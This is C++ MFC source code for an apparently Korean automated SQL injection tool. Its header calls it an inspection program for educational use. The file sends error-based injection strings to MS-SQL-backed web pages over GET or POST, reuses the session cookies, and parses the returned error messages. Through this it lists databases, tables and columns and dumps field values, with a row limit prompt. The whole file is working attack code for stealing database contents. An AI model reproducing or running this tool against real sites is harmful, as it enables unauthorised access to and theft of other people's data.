/*
  본 프로그램은 MS-SQL서버 연동하는 웹 페이지에 에러 메시지 기반
  SQL 인젝션 취약점이 존재할 경우에 해당 DBMS 정보(DB명,테이블명,
  필드명, 데이터 값)를 뽑아(select)내는 점검 프로그램입니다.

  이 프로그램을 구현하기 위해서 짧은 시간에 MFC를 학습하였기에 코
  드 완성도가 많이 떨어지고 C++ 스타일 답지 않을 수 있습니다.

  해당 소스는 누구나 자유롭게 배포할 수 있으며, 수정도 가능합니다.
  
  단, 악용하였을 경우에는 해킹 프로그램을 오용될 수 있기 때문에 학습
  용도로만 사용해야 합니다.

  악용하였을 경우에는 본인이 책임을 져야 합니다.

  작성자 : 김태훈(franc3sco@paran.com)

*/
// MssqlCode.cpp : 구현 파일입니다.
//

#include "stdafx.h"
#include "SITE.h"
#include "MssqlCode.h"


// CMssqlCode
DWORD CMssqlCode::m_dwDBcount = 0;
DWORD CMssqlCode::m_dwTBcount = 0;
DWORD CMssqlCode::m_dwFDcount = 0;
DWORD CMssqlCode::m_dwDTcount = 0;

char CMssqlCode::g_szLogBuffer[2048] = {0};
char CMssqlCode::g_szLogTime[32] = {0};

IMPLEMENT_DYNAMIC(CMssqlCode, CWnd)

CMssqlCode::CMssqlCode()
{
	
}

CMssqlCode::~CMssqlCode()
{

}


BEGIN_MESSAGE_MAP(CMssqlCode, CWnd)
END_MESSAGE_MAP()

CSITEDoc* CMssqlCode::GetDocument()
{
	CSITEDoc * po_Document =  (CSITEDoc *)((CMainFrame *)AfxGetMainWnd())->GetActiveDocument();
	return po_Document;
}

// CMssqlCode 메시지 처리기입니다.

bool CMssqlCode::SQLInjectionAttack(CProcessControl *pPCtrl, DWORD category_flag, DWORD count_idx)
{
	CSITEDoc * po_Document = GetDocument();

	switch ( po_Document->m_InjectionCategory ) {
		case GET_DBMS:
			{
				if ( po_Document->m_dwDBrange == DBRANGE_CURRENT ) {
					GetCurrentDBnameQuery(pPCtrl);
				} else if ( po_Document->m_dwDBrange == DBRANGE_ALL ) {
					GetDBListQuery(pPCtrl);
				}
			}
			break;

		case GET_TABLE:
			GetTableListQuery(pPCtrl, category_flag, count_idx);
			break;

		case GET_FIELD:
			GetFieldListQuery(pPCtrl,  category_flag, count_idx);
			break;

		case GET_DATA:
			GetDataListQuery(pPCtrl,  category_flag, count_idx);
			break;
	}

	return true;
}


bool CMssqlCode::GetCurrentDBnameQuery(CProcessControl *pPCtrl)
{

	CString objContentLength;
	CString InjectionCode;
	char szResult[64] = {0};
	CString	o_postInjectionParameter;
	CSITEDoc * po_Document = GetDocument();
	CString &r_HttpHeader = po_Document->m_HttpHeader;


	if ( po_Document->m_VarType == VARTYPE_STRING) InjectionCode.Append("'");
	InjectionCode.Append(MSSQL_INJCODE_CURRENTDATABASE);

	try {
		switch ( po_Document->m_GetPost ) {

			case HTTP_GET:
				//pPCtrl->m_szObject.Append("?");
				//pPCtrl->m_szObject.Append(po_Document->m_HttpParameter);
				pPCtrl->m_szObject.Append(InjectionCode);
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_GET, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader,HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
				AddHttpRequestHeader();

				po_Document->m_pFile->SendRequest();
				break;

			case HTTP_POST:
				o_postInjectionParameter = po_Document->m_HttpParameter;
				o_postInjectionParameter.Append(InjectionCode);
				objContentLength.Format("Content-Length: %d", o_postInjectionParameter.GetLength());
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_POST, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				po_Document->m_pFile->AddRequestHeaders(objContentLength);
				AddHttpRequestHeader();				
				po_Document->m_pFile->SendRequest(NULL, 0, (LPVOID)(LPCTSTR)o_postInjectionParameter, o_postInjectionParameter.GetLength());
				
				break;
		}	
		
		SendLogDataToListView(pPCtrl, pPCtrl->m_szObject, po_Document->m_HttpParameter);
	
	}
	catch (CInternetException* pEx) {
		pEx->ReportError(); 
        pEx->Delete(); 
	
	}

	ReadResultStream(pPCtrl, &szResult[0], sizeof(szResult));
	SendItemToTreeView( &szResult[0], (DWORD)po_Document->m_InjectionCategory);
	pPCtrl->HttpConnectionClose();
	return true;
}

bool CMssqlCode::GetDBListQuery(CProcessControl * pPCtrl, DWORD category_flag, DWORD count_idx)
{
	CString ResultMSG;
	CString tmp;

	if ( category_flag == CATEGORY_COUNT) {
		m_dwDBcount = GetNumOfDBList(pPCtrl);

		if ( m_dwDBcount == 0 ) {
			ResultMSG.Format("%s 데이터베이스를 갖고 있지 않습니다.", CSITEView::g_szDBname);
			MessageBox(ResultMSG);
			return false;
		}
		category_flag = CATEGORY_DATA;
	}

	if ( category_flag == CATEGORY_DATA ) {
		DWORD count_idx;
		for ( count_idx = 1; count_idx <= m_dwDBcount; count_idx ++ ) {

			pPCtrl->InitialReferenceData();
			if ( pPCtrl->HttpParameterReconstruction()  == false) return false;
			if ( pPCtrl->HttpConnectionInitial() == false) {
				pPCtrl->HttpConnectionClose();
				return false;
			}
			GetDBNameQuery(pPCtrl, count_idx);
		}
	}
	
	return true;
}


int CMssqlCode::GetNumOfDBList(CProcessControl* pPCtrl)
{
	CString objContentLength;
	CString InjectionCode;
	CString	InjectionCodeFormat;
	CString	o_postInjectionParameter;

	char szResult[64] = {0};

	CSITEDoc * po_Document = GetDocument();

	if ( po_Document->m_VarType == VARTYPE_STRING) InjectionCode.Append("'");

	InjectionCodeFormat.Format(MSSQL_INJCODE_NUMOFDATABSE);
	InjectionCode.Append(InjectionCodeFormat);

	try {
		switch ( po_Document->m_GetPost ) {

			case HTTP_GET:
				pPCtrl->m_szObject.Append(InjectionCode);
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_GET, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				AddHttpRequestHeader();

				po_Document->m_pFile->SendRequest();

				break;

			case HTTP_POST:				
				o_postInjectionParameter = po_Document->m_HttpParameter;
				o_postInjectionParameter.Append(InjectionCode);
				objContentLength.Format("Content-Length: %d", o_postInjectionParameter.GetLength());
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_POST, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				po_Document->m_pFile->AddRequestHeaders(objContentLength);
				AddHttpRequestHeader();				
				po_Document->m_pFile->SendRequest(NULL, 0, (LPVOID)(LPCTSTR)o_postInjectionParameter, o_postInjectionParameter.GetLength());
				break;
		}

		SendLogDataToListView(pPCtrl, pPCtrl->m_szObject, po_Document->m_HttpParameter);
  	
	}
	catch (CInternetException* pEx) {
		pEx->ReportError(); 
        pEx->Delete(); 
	
	}

	ReadResultStream(pPCtrl, &szResult[0], sizeof(szResult));	
	pPCtrl->HttpConnectionClose();

	return atoi(&szResult[0]);
}

bool CMssqlCode::GetDBNameQuery(CProcessControl * pPCtrl, DWORD count_idx)
{
	char szResult[64] = {0};
	CString objContentLength;
	CString InjectionCode;
	CString	InjectionCodeFormat;
	CString	o_postInjectionParameter;

	CSITEDoc * po_Document = GetDocument();

	if ( po_Document->m_VarType == VARTYPE_STRING) InjectionCode.Append("'");
	InjectionCodeFormat.Format(MSSQL_INJCODE_ALLDATABASE,count_idx);
	
	InjectionCode.Append(InjectionCodeFormat);

	try {
		switch ( po_Document->m_GetPost ) {
			case HTTP_GET:
				{
				pPCtrl->m_szObject.Append(InjectionCode);
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_GET, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				AddHttpRequestHeader();
				po_Document->m_pFile->SendRequest();

				}
				break;

			case HTTP_POST:	
				o_postInjectionParameter = po_Document->m_HttpParameter;
				o_postInjectionParameter.Append(InjectionCode);
				objContentLength.Format("Content-Length: %d", o_postInjectionParameter.GetLength());
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_POST, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				po_Document->m_pFile->AddRequestHeaders(objContentLength);
				AddHttpRequestHeader();				
				po_Document->m_pFile->SendRequest(NULL, 0, (LPVOID)(LPCTSTR)o_postInjectionParameter, o_postInjectionParameter.GetLength());
				break;
		}

	  	SendLogDataToListView(pPCtrl, pPCtrl->m_szObject, po_Document->m_HttpParameter);
	}
	catch (CInternetException* pEx) {
		pEx->ReportError(); 
		pEx->Delete(); 
	
	}

	ReadResultStream(pPCtrl, &szResult[0], sizeof(szResult));
	SendItemToTreeView( &szResult[0], (DWORD)po_Document->m_InjectionCategory);
	pPCtrl->HttpConnectionClose();

	return true;
}


bool CMssqlCode::GetTableListQuery(CProcessControl *pPCtrl, DWORD category_flag, DWORD count_idx)
{
	CString ResultMSG;

	if ( category_flag == CATEGORY_COUNT) {
		m_dwTBcount = GetNumOfTableList(pPCtrl);

		if ( m_dwTBcount == 0 ) {
			ResultMSG.Format("%s 데이터베이스는 테이블을 갖고 있지 않습니다.", CSITEView::g_szDBname);
			MessageBox(ResultMSG);
			return false;
		}
	}

	if ( category_flag == CATEGORY_DATA ) {
		GetTableNameQuery(pPCtrl, count_idx);
	}
	
	return true;
}




int CMssqlCode::GetNumOfTableList(CProcessControl *pPCtrl)
{
	
	CString objContentLength;
	CString InjectionCode;
	CString	InjectionCodeFormat;
	CString	o_postInjectionParameter;

	char szResult[64] = {0};

	CSITEDoc * po_Document = GetDocument();


	if ( po_Document->m_VarType == VARTYPE_STRING) InjectionCode.Append("'");

	InjectionCodeFormat.Format(MSSQL_INJCODE_NUMOFTABLES,CSITEView::g_szDBname);
	InjectionCode.Append(InjectionCodeFormat);

	try {
		switch ( po_Document->m_GetPost ) {

			case HTTP_GET:

				pPCtrl->m_szObject.Append(InjectionCode);
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_GET, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				AddHttpRequestHeader();
				po_Document->m_pFile->SendRequest();

				break;

			case HTTP_POST:
				
				o_postInjectionParameter = po_Document->m_HttpParameter;
				o_postInjectionParameter.Append(InjectionCode);
				objContentLength.Format("Content-Length: %d", o_postInjectionParameter.GetLength());
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_POST, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				po_Document->m_pFile->AddRequestHeaders(objContentLength);
				AddHttpRequestHeader();				
				po_Document->m_pFile->SendRequest(NULL, 0, (LPVOID)(LPCTSTR)o_postInjectionParameter, o_postInjectionParameter.GetLength());
				break;
		}

		SendLogDataToListView(pPCtrl, pPCtrl->m_szObject, po_Document->m_HttpParameter);
  	
	}
	catch (CInternetException* pEx) {
		pEx->ReportError(); 
        pEx->Delete(); 
	
	}

	ReadResultStream(pPCtrl, &szResult[0], sizeof(szResult));	
	pPCtrl->HttpConnectionClose();

	return atoi(&szResult[0]);
}


bool CMssqlCode::GetTableNameQuery(CProcessControl *pPCtrl, DWORD count_idx)
{

	char szResult[64] = {0};
	CString objContentLength;
	CString InjectionCode;
	CString	InjectionCodeFormat;
	CString	o_postInjectionParameter;

	CSITEDoc * po_Document = GetDocument();

	if ( po_Document->m_VarType == VARTYPE_STRING) InjectionCode.Append("'");
	InjectionCodeFormat.Format(MSSQL_INJCODE_TABLENAME,count_idx, CSITEView::g_szDBname);
	
	InjectionCode.Append(InjectionCodeFormat);

	
	try {
		switch ( po_Document->m_GetPost ) {
			case HTTP_GET:
				{

				pPCtrl->m_szObject.Append(InjectionCode);

				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_GET, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				AddHttpRequestHeader();
				po_Document->m_pFile->SendRequest();
				}
				break;

			case HTTP_POST:	
				o_postInjectionParameter = po_Document->m_HttpParameter;
				o_postInjectionParameter.Append(InjectionCode);
				objContentLength.Format("Content-Length: %d", o_postInjectionParameter.GetLength());
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_POST, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				po_Document->m_pFile->AddRequestHeaders(objContentLength);
				AddHttpRequestHeader();				
				po_Document->m_pFile->SendRequest(NULL, 0, (LPVOID)(LPCTSTR)o_postInjectionParameter, o_postInjectionParameter.GetLength());
				break;
		}

		SendLogDataToListView(pPCtrl, pPCtrl->m_szObject, po_Document->m_HttpParameter);
	  	
	}
	catch (CInternetException* pEx) {
		pEx->ReportError(); 
		pEx->Delete(); 
	
	}

	ReadResultStream(pPCtrl, &szResult[0], sizeof(szResult));
	SendItemToTreeView( &szResult[0], (DWORD)po_Document->m_InjectionCategory);
	pPCtrl->HttpConnectionClose();

	return true;
}


bool CMssqlCode::GetFieldListQuery(CProcessControl *pPCtrl, DWORD category_flag, DWORD count_idx)
{
	CString ResultMSG;

	if ( category_flag == CATEGORY_COUNT) {
		m_dwFDcount = GetNumOfFieldList(pPCtrl);

		if ( m_dwFDcount == 0 ) {
			ResultMSG.Format("%s 테이블은 필드를 갖고 있지 않습니다.", CSITEView::g_szTBname);
			MessageBox(ResultMSG);
			return false;
		}
	}

	if ( category_flag == CATEGORY_DATA ) {
		GetFieldNameQuery(pPCtrl, count_idx);
	}
	
	return true;

}


int CMssqlCode::GetNumOfFieldList(CProcessControl *pPCtrl)
{

	CString objContentLength;
	CString InjectionCode;
	CString	InjectionCodeFormat;
	char szResult[64] = {0};
	CString	o_postInjectionParameter;

	CSITEDoc * po_Document = GetDocument();

	if ( po_Document->m_VarType == VARTYPE_STRING) InjectionCode.Append("'");

	InjectionCodeFormat.Format(MSSQL_INJCODE_NUMOFFIELD, CSITEView::g_szDBname, CSITEView::g_szDBname, CSITEView::g_szTBname);
	InjectionCode.Append(InjectionCodeFormat);

	try {
		switch ( po_Document->m_GetPost ) {

			case HTTP_GET:
				pPCtrl->m_szObject.Append(InjectionCode);
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_GET, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				AddHttpRequestHeader();
				po_Document->m_pFile->SendRequest();

				break;

			case HTTP_POST:				
				o_postInjectionParameter = po_Document->m_HttpParameter;
				o_postInjectionParameter.Append(InjectionCode);
				objContentLength.Format("Content-Length: %d", o_postInjectionParameter.GetLength());
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_POST, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				po_Document->m_pFile->AddRequestHeaders(objContentLength);
				AddHttpRequestHeader();				
				po_Document->m_pFile->SendRequest(NULL, 0, (LPVOID)(LPCTSTR)o_postInjectionParameter, o_postInjectionParameter.GetLength());
				break;
		}		 

		SendLogDataToListView(pPCtrl, pPCtrl->m_szObject, po_Document->m_HttpParameter);
  	
	}
	catch (CInternetException* pEx) {
		pEx->ReportError(); 
        pEx->Delete(); 
	
	}

	ReadResultStream(pPCtrl, &szResult[0], sizeof(szResult));	
	pPCtrl->HttpConnectionClose();

	return atoi(&szResult[0]);

}


bool CMssqlCode::GetFieldNameQuery(CProcessControl *pPCtrl, DWORD count_idx)
{
	CString objContentLength;
	CString InjectionCode;
	CString InjectionCodeFormat;
	char szResult[64] = {0};
	CString	o_postInjectionParameter;


	CSITEDoc * po_Document = GetDocument();

	if ( po_Document->m_VarType == VARTYPE_STRING) InjectionCode.Append("'");
	InjectionCodeFormat.Format(MSSQL_INJCODE_FIELDNAME, count_idx, CSITEView::g_szDBname, CSITEView::g_szDBname, CSITEView::g_szTBname);

	InjectionCode.Append(InjectionCodeFormat);

			
	try {
		switch ( po_Document->m_GetPost ) {
			case HTTP_GET:
				{
				pPCtrl->m_szObject.Append(InjectionCode);

				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_GET, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				AddHttpRequestHeader();
				po_Document->m_pFile->SendRequest();
				}
				break;

			case HTTP_POST:	
				o_postInjectionParameter = po_Document->m_HttpParameter;
				o_postInjectionParameter.Append(InjectionCode);
				objContentLength.Format("Content-Length: %d", o_postInjectionParameter.GetLength());
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_POST, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				po_Document->m_pFile->AddRequestHeaders(objContentLength);
				AddHttpRequestHeader();				
				po_Document->m_pFile->SendRequest(NULL, 0, (LPVOID)(LPCTSTR)o_postInjectionParameter, o_postInjectionParameter.GetLength());
				break;
		}		   

		SendLogDataToListView(pPCtrl, pPCtrl->m_szObject, po_Document->m_HttpParameter);
	  	
	}
	catch (CInternetException* pEx) {
		pEx->ReportError(); 
		pEx->Delete(); 
	
	}

	ReadResultStream(pPCtrl, &szResult[0], sizeof(szResult));
	SendItemToTreeView( &szResult[0], (DWORD)po_Document->m_InjectionCategory);
	pPCtrl->HttpConnectionClose();

	return true;

}


bool CMssqlCode::GetDataListQuery(CProcessControl * pPCtrl, DWORD category_flag, DWORD count_idx)
{
	CString ResultMSG;
	int nMSGresult = 0;

	if ( category_flag == CATEGORY_COUNT) {
		m_dwDTcount = GetNumOfDataList(pPCtrl);

		if ( m_dwDTcount == 0 ) {
			ResultMSG.Format("%s 필드는 데이터를 갖고 있지 않습니다.", CSITEView::g_szTBname);
			MessageBox(ResultMSG);
			return false;
		} else if (m_dwDTcount > LIMITDATACOUNT) {
			CString o_Msg;
			o_Msg.Empty();
			o_Msg.Format(TOOMUCHDATA_MSG,m_dwDTcount);
			nMSGresult = AfxMessageBox(o_Msg, MB_YESNO|MB_ICONQUESTION);
			if ( nMSGresult == IDYES ) m_dwDTcount = LIMITDATACOUNT;
		}
	}

	if ( category_flag == CATEGORY_DATA ) {
		GetDataValueQuery(pPCtrl, count_idx);
	}
	
	return true;

}

int CMssqlCode::GetNumOfDataList(CProcessControl * pPCtrl)
{
	CString objContentLength;
	CString InjectionCode;
	CString InjectionCodeFormat;
	char szResult[64] = {0};
	CString	o_postInjectionParameter;

	CSITEDoc * po_Document = GetDocument();


	if ( po_Document->m_VarType == VARTYPE_STRING) InjectionCode.Append("'");
	InjectionCodeFormat.Format(MSSQL_INJCODE_NUMOFDATA, CSITEView::g_szDBname, CSITEView::g_szTBname);
	
	InjectionCode.Append(InjectionCodeFormat);

	try {
		switch ( po_Document->m_GetPost ) {

			case HTTP_GET:
				pPCtrl->m_szObject.Append(InjectionCode);
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_GET, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				AddHttpRequestHeader();
				po_Document->m_pFile->SendRequest();

				break;

			case HTTP_POST:				
				o_postInjectionParameter = po_Document->m_HttpParameter;
				o_postInjectionParameter.Append(InjectionCode);
				objContentLength.Format("Content-Length: %d", o_postInjectionParameter.GetLength());
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_POST, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				po_Document->m_pFile->AddRequestHeaders(objContentLength);
				AddHttpRequestHeader();				
				po_Document->m_pFile->SendRequest(NULL, 0, (LPVOID)(LPCTSTR)o_postInjectionParameter, o_postInjectionParameter.GetLength());
				break;
		}	

		SendLogDataToListView(pPCtrl, pPCtrl->m_szObject, po_Document->m_HttpParameter);
  	
	}
	catch (CInternetException* pEx) {
		pEx->ReportError(); 
        pEx->Delete(); 
	
	}

	ReadResultStream(pPCtrl, &szResult[0], sizeof(szResult));	
	pPCtrl->HttpConnectionClose();

	return atoi(&szResult[0]);

}

bool CMssqlCode::GetDataValueQuery(CProcessControl* pPCtrl, DWORD count_idx)
{

	CString objContentLength;
	CString InjectionCode;
	CString InjectionCodeFormat;
	char szResult[128] = {0};
	CString	o_postInjectionParameter;

	CSITEDoc * po_Document = GetDocument();


	if ( po_Document->m_VarType == VARTYPE_STRING) InjectionCode.Append("'");
	InjectionCodeFormat.Format(MSSQL_INJCODE_DATAVALUE,CSITEView::g_szFDname,count_idx,CSITEView::g_szFDname,CSITEView::g_szDBname,CSITEView::g_szTBname,CSITEView::g_szFDname, CSITEView::g_szFDname);

	InjectionCode.Append(InjectionCodeFormat);

	try {
		switch ( po_Document->m_GetPost ) {
			case HTTP_GET:
				{
				pPCtrl->m_szObject.Append(InjectionCode);

				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_GET, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				AddHttpRequestHeader();
				po_Document->m_pFile->SendRequest();
				}
				break;

			case HTTP_POST:	
				o_postInjectionParameter = po_Document->m_HttpParameter;
				o_postInjectionParameter.Append(InjectionCode);
				objContentLength.Format("Content-Length: %d", o_postInjectionParameter.GetLength());
				po_Document->m_pFile = po_Document->m_pServer->OpenRequest(CHttpConnection::HTTP_VERB_POST, pPCtrl->m_szObject, NULL, 1, NULL, NULL,pPCtrl->m_dwHttpRequestFlags);
				po_Document->m_pFile->AddRequestHeaders(po_Document->m_HttpHeader);
				po_Document->m_pFile->AddRequestHeaders(objContentLength);
				AddHttpRequestHeader();				
				po_Document->m_pFile->SendRequest(NULL, 0, (LPVOID)(LPCTSTR)o_postInjectionParameter, o_postInjectionParameter.GetLength());
				break;
		}	

		SendLogDataToListView(pPCtrl, pPCtrl->m_szObject, po_Document->m_HttpParameter);
	  	
	}
	catch (CInternetException* pEx) {
		pEx->ReportError(); 
		pEx->Delete(); 
	
	}

	ReadResultStream(pPCtrl, &szResult[0], sizeof(szResult));
	SendItemToTreeView( &szResult[0], (DWORD)po_Document->m_InjectionCategory);
	pPCtrl->HttpConnectionClose();

	return true;
}


bool CMssqlCode::ReadResultStream(CProcessControl *pPCtrl, char *pszResult, DWORD size)
{
	DWORD	dwRet;
	int idx = 0;
	CString o_ReadStream;
	CString	o_ResultString;
	char	szReadBuffer[HTTPREADBUFFER] = {0};

	CSITEDoc * po_Document = GetDocument();	
	po_Document->m_pFile->QueryInfoStatusCode(dwRet); 
	
	o_ReadStream.Empty();
	o_ResultString.Empty();

	try {
		while ( po_Document->m_pFile->Read(szReadBuffer,HTTPREADBUFFER -1) > 0) 
		{ 
			o_ReadStream.Append(szReadBuffer);
		} 
	} catch (CInternetException* pEx) {
		pEx->ReportError(); 
        pEx->Delete(); 
	
	}

	o_ReadStream = strstr((LPCSTR)(LPCTSTR)o_ReadStream, MSSQL_ERR_DELIMITER);

	if ( (o_ResultString = o_ReadStream.Tokenize(MSSQL_ERR_DELIMITER, idx) ) == "") o_ResultString = "NULL";

	strncpy(pszResult, o_ResultString, size);

	return true;
}

bool CMssqlCode::SendItemToTreeView(char *pszItem, DWORD category_type)
{
	CSITEDoc * po_Document = GetDocument();
	CSITEView * pSITEView =  po_Document->GetMainFrame()->GetSITEView();
	
	pSITEView->InsertItemonTreeView(pszItem , category_type);

	return true;
}


bool CMssqlCode::SendLogDataToListView(CProcessControl *pPCtrl, CString objURI, CString objPostParameter)
{
	
	CTime obj_Time;
	CSITEDoc * po_Document = GetDocument();		
	CLogDataView  *pLogView = po_Document->GetMainFrame()->GetRightGroupView()->GetRightBottomView();

	obj_Time = CTime::GetCurrentTime();
	CString  obj_t = obj_Time.Format("%Y-%m-%d %H:%M:%S");

	memset(g_szLogBuffer, '\0', sizeof(g_szLogBuffer));
	memset(g_szLogTime, '\0', sizeof(g_szLogTime));

	strncpy(g_szLogBuffer,pPCtrl->m_szServerName, sizeof(g_szLogBuffer)-1);
	if ( po_Document->m_GetPost == HTTP_GET ) {
		strcat(g_szLogBuffer,objURI);	
	}
	else if ( po_Document->m_GetPost == HTTP_POST ) {
		strcat(g_szLogBuffer,objURI);
		strcat(g_szLogBuffer,"?");
		strcat(g_szLogBuffer,objPostParameter);
	}

	strncpy(g_szLogTime, obj_t, sizeof(g_szLogTime)-1);

	pLogView->InsertLogDataItem();	
	return true;
}

bool CMssqlCode::AddHttpRequestHeader(void)
{

	CSITEDoc * po_Document = GetDocument();
	CString &r_HttpHeader = po_Document->m_HttpHeader;

	CString o_ResultString;
	int idx = 0;

	o_ResultString = r_HttpHeader.Tokenize("\r\n", idx);

	while ( o_ResultString != "" ) {
		if (o_ResultString.Find("Cookie") != -1 ) {
			o_ResultString.Append("\r\n");
			po_Document->m_pFile->AddRequestHeaders(o_ResultString,HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE|HTTP_QUERY_SET_COOKIE);
		}
		o_ResultString = r_HttpHeader.Tokenize("\r\n", idx);
	}
	
	return false;
}
